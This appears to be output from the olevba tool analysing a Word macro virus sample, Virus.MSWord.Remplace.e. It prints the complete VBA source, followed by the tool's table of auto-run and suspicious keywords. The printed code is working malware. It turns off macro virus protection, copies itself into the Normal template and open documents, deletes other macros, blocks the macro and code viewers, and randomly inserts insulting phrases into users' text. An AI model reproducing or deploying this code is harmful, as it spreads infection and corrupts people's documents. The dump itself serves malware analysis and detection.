olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Remplace.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Remplace.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO akrnl.bas 
in file: Virus.MSWord.Remplace.e - OLE stream: 'Macros/VBA/akrnl'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
Sub AutoExec()
    On Error Resume Next
    Call Sauve
End Sub
Sub AutoNew()
 On Error Resume Next
 Call Sauve
End Sub
Sub AutoPrint()
 On Error Resume Next
 Call Sauve
End Sub

Sub FileNew()
    On Error Resume Next
    Call Sauve
dialogs(wdDialogFileNew).show
    Skip = 1
    Call Sauve
    
End Sub
Sub FileClose()
    On Error Resume Next
    Call Sauve
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
    Call Sauve
End Sub
Sub FileExit()
    On Error Resume Next
    Call Sauve
    Application.Quit
End Sub
    

Sub autoOpen()
    On Error Resume Next
    'Call akrnl
    'Call Sauve
    
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Sauve
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub

Sub AutoClose()
    On Error Resume Next
    Call Sauve
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Call Sauve
End Sub
Sub ToolsMacro()
    On Error Resume Next
    
End Sub
Sub FileTemplates()
    On Error Resume Next
    
End Sub
Sub ViewVBCode()
   On Error Resume Next
   
End Sub

Sub RandomRemplace()
randomize
ValRandom = Int(Rnd * 75)
    If ValRandom < 20 Then BesoinRemplace = True
    If ValRandom < 20 Then txt = "ainsi, si j'en crois ce que mon incompétant de professeur me dit,"
    If ValRandom < 15 Then txt = "ainsi, mon chat a perdu ses dents. De plus,"
    If ValRandom < 10 Then txt = "ainsi, selon ma grand-mère,"
    If ValRandom < 5 Then txt = "ainsi, la matière du cours est plate. De plus,"
    
    If BesoinRemplace = True Then Call Remplace(txt)
    
    
    
End Sub
    

Sub Remplace(txt)
 
Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = "donc,"
        .Replacement.Text = txt
        .Forward = True
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceOne
    Selection.MoveUp Unit:=wdScreen, Count:=8
    

End Sub

Sub Sauve()

On Error Resume Next
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents("akrnl").Export "c:\Étudiant.cfg"
ActiveDocument.ReadOnlyRecommended = False

For i = 1 To ActiveDocument.VBProject.VBComponents.Count
NomMacro = ActiveDocument.VBProject.VBComponents(i).Name
If NomMacro = "akrnl" Then PrésentAct = True Else Call DelVir(NomMacro)
Next i

For i = 1 To NormalTemplate.VBProject.VBComponents.Count
NomMacro = NormalTemplate.VBProject.VBComponents(i).Name
If NomMacro = "akrnl" Then PrésentNorm = True Else Call DelVir(NomMacro)
Next i

If PrésentAct = True And PrésentNorm = False Then Set BesoinSauve = NormalTemplate.VBProject.VBComponents
If PrésentAct = False And PrésentNorm = True Then Set BesoinSauve = ActiveDocument.VBProject.VBComponents

BesoinSauve.Import "c:\Étudiant.cfg"

If PrésentNorm = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
If PrésentAct = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument

End Sub
Sub DelVir(NomMacro)
On Error Resume Next

Application.VBE.ActiveVBProject.VBComponents.Remove _
                         Application.VBE.ActiveVBProject.VBComponents(NomMacro)
                         
With Application.NormalTemplate.VBProject
             .VBComponents.Remove .VBComponents(NomMacro)
    End With
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

